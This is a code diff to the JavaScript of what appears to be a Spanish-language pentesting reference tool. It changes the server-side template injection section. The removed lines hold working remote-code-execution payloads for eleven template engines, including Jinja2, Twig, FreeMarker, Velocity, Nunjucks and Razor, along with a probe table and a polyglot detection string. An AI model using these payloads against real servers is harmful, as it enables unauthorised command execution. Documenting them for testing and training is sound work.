@@ -4685,11 +4685,18 @@ const WEB_VULNS=[
     desc:'La entrada del usuario se concatena directamente en una plantilla del lado servidor. Según el motor puede escalar de simple inyección a ejecución remota de comandos.',
     detection:`Inyectar el polyglot \${{<%[%'"}}%\\ para provocar error, luego probar {{7*7}} — si la respuesta muestra 49, hay evaluación de plantilla.`,
     engineTable:[
-      {payload:'{{7*7}}',       result:'49', engine:'Jinja2 / Tornado (Python) o Twig (PHP)'},
-      {payload:'<%= 7*7 %>',    result:'49', engine:'ERB (Ruby)'},
-      {payload:'${7*7}',        result:'49', engine:'FreeMarker (Java)'},
-      {payload:'@(7*7)',        result:'49', engine:'Razor (.NET)'},
-      {payload:'#{7*7}',        result:'49', engine:'Ruby / Thymeleaf'},
+      {lang:'Python',  engine:'Jinja2',     payload:'{{7*7}}',    result:'49'},
+      {lang:'Python',  engine:'Mako',       payload:'',           result:''},
+      {lang:'PHP',     engine:'Twig',       payload:'',           result:''},
+      {lang:'PHP',     engine:'Smarty',     payload:'',           result:''},
+      {lang:'Java',    engine:'FreeMarker', payload:'',           result:''},
+      {lang:'Java',    engine:'Velocity',   payload:'',           result:''},
+      {lang:'Java',    engine:'Thymeleaf',  payload:'[[${7*7}]]', result:'49'},
+      {lang:'Ruby',    engine:'ERB',        payload:'<%= 7*7 %>', result:'49'},
+      {lang:'Node.js', engine:'EJS',        payload:'',           result:''},
+      {lang:'Node.js', engine:'Pug',        payload:'',           result:''},
+      {lang:'Node.js', engine:'Handlebars', payload:'',           result:''},
+      {lang:'.NET',    engine:'Razor',      payload:'@(7*7)',     result:'49'},
     ],
   },
   {
@@ -4946,21 +4953,10 @@ function openWebVuln(id){
   }
 
   if(v.engineTable){
-    html+=`<div class="wv-sec"><div class="wv-sec-title det">Identificación de motor</div>
-      <table class="wv-eng-table"><thead><tr><th>Payload</th><th>Resultado</th><th>Motor</th></tr></thead><tbody>
-      ${v.engineTable.map(r=>`<tr><td>${esc(r.payload)}</td><td>${esc(r.result)}</td><td>${esc(r.engine)}</td></tr>`).join('')}
+    html+=`<div class="wv-sec"><div class="wv-sec-title det">Motores de plantillas</div>
+      <table class="wv-eng-table"><thead><tr><th>Lenguaje</th><th>Motor</th><th>Payload de prueba</th><th>Resultado</th></tr></thead><tbody>
+      ${v.engineTable.map(r=>`<tr><td>${esc(r.lang)}</td><td>${esc(r.engine)}</td><td>${r.payload?esc(r.payload):'<span style="color:var(--text3)">—</span>'}</td><td>${r.result?esc(r.result):'<span style="color:var(--text3)">—</span>'}</td></tr>`).join('')}
       </tbody></table></div>`;
-  }
-
-  if(v.id==='ssti'){
-    const probeOpts=['{{7*7}}','<%= 7*7 %>','${7*7}','@(7*7)','#{7*7}','{7*7}','#set($x=7*7)$x']
-      .map(pp=>`<option value="${esc(pp)}">${esc(pp)}</option>`).join('');
-    html+=`<div class="wv-sec"><div class="wv-sec-title pay">Identificador de motor (interactivo)</div>
-      <div class="enum-generator" style="border-color:rgba(0,221,255,.3);">
-        <div class="enum-gen-row"><span class="enum-gen-label">Payload probado</span><select class="enum-gen-sel" id="sstiProbe" onchange="identifySsti()" style="flex:1;">${probeOpts}</select></div>
-        <div class="enum-gen-row" style="align-items:flex-start;"><span class="enum-gen-label">Respuesta vista</span><input type="text" class="enum-gen-input" id="sstiResp" oninput="identifySsti()" placeholder="Pega lo que devolvió el servidor (ej: 49)"></div>
-        <div id="sstiIdOut" style="margin-top:8px;"></div>
-      </div></div>`;
   }
 
   if(v.payloads){
@@ -4986,50 +4982,6 @@ function openWebVuln(id){
   d.innerHTML=html;
   const sc=document.getElementById('webvulnScroll'); if(sc) sc.scrollTop=0;
   if(v.generator){ _sqliCat='detect'; renderSqliGen(); }
-  if(v.id==='ssti') identifySsti();
-}
-
-// ─── SSTI ENGINE IDENTIFIER ───────────────────────────────────────────────────
-// probe = payload que devuelve 49 en ese motor; rce = payload de ejecución
-const SSTI_ENGINES=[
-  {engine:'Jinja2',    lang:'Python',  probe:'{{7*7}}',    rce:`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`},
-  {engine:'Tornado',   lang:'Python',  probe:'{{7*7}}',    rce:`{% import os %}{{ os.popen('id').read() }}`},
-  {engine:'Mako',      lang:'Python',  probe:'${7*7}',     rce:`\${__import__('os').popen('id').read()}`},
-  {engine:'ERB',       lang:'Ruby',    probe:'<%= 7*7 %>', rce:'<%= `id` %>'},
-  {engine:'FreeMarker',lang:'Java',    probe:'${7*7}',     rce:`<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`},
-  {engine:'Velocity',  lang:'Java',    probe:'#set($x=7*7)$x', rce:`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")`},
-  {engine:'Twig',      lang:'PHP',     probe:'{{7*7}}',    rce:`{{['id']|filter('system')}}`},
-  {engine:'Smarty',    lang:'PHP',     probe:'{7*7}',      rce:`{system('id')}`},
-  {engine:'Nunjucks',  lang:'Node.js', probe:'{{7*7}}',    rce:`{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`},
-  {engine:'Razor',     lang:'.NET',    probe:'@(7*7)',     rce:`@{ System.Diagnostics.Process.Start("cmd.exe","/c id"); }`},
-  {engine:'Thymeleaf', lang:'Java',    probe:'#{7*7}',     rce:`[[\${T(java.lang.Runtime).getRuntime().exec('id')}]]`},
-];
-
-function identifySsti(){
-  const probe=document.getElementById('sstiProbe').value;
-  const resp=(document.getElementById('sstiResp').value||'').trim();
-  const out=document.getElementById('sstiIdOut');
-  const candidates=SSTI_ENGINES.filter(e=>e.probe===probe);
-  const evaluated=resp.includes('49');
-  let banner='';
-  if(resp){
-    banner=evaluated
-      ? `<div class="enum-note" style="background:rgba(0,255,136,.06);border-color:rgba(0,255,136,.3);color:var(--green);">✓ La respuesta contiene "49" — la plantilla evalúa expresiones. SSTI confirmado.</div>`
-      : `<div class="enum-note">La respuesta no contiene "49". Si el payload se refleja sin evaluar, prueba otro motor/sintaxis o revisa el contexto.</div>`;
-  }
-  out.innerHTML=banner+`<div style="font-size:11px;color:var(--text3);margin:8px 0 4px;font-family:var(--mono);">Motores que responden a <span style="color:var(--orange)">${esc(probe)}</span> con RCE:</div>`+
-    candidates.map(e=>`
-      <div class="enum-cmd-card">
-        <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
-          <span style="font-size:12px;font-weight:700;color:var(--cyan);font-family:var(--mono);">${esc(e.engine)}</span>
-          <span style="font-size:9px;color:var(--text3);background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:1px 6px;font-family:var(--mono);">${esc(e.lang)}</span>
-        </div>
-        <div class="enum-cmd-row" style="align-items:flex-start;">
-          <div class="enum-cmd-code" style="white-space:pre-wrap;word-break:break-all;">${esc(e.rce)}</div>
-          <button class="enum-copy-btn" onclick='enumCopy(this,${jarg(e.rce)})'>⎘ Copiar</button>
-          <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${jarg(e.rce)},${jarg('SSTI RCE — '+e.engine+' ('+e.lang+')')},"web","Web Exploitation","web-exploitation",["web-exploitation","ssti"])'>💾</button>
-        </div>
-      </div>`).join('');
 }
 
 // ─── DICTIONARIES & POLYGLOTS ─────────────────────────────────────────────────
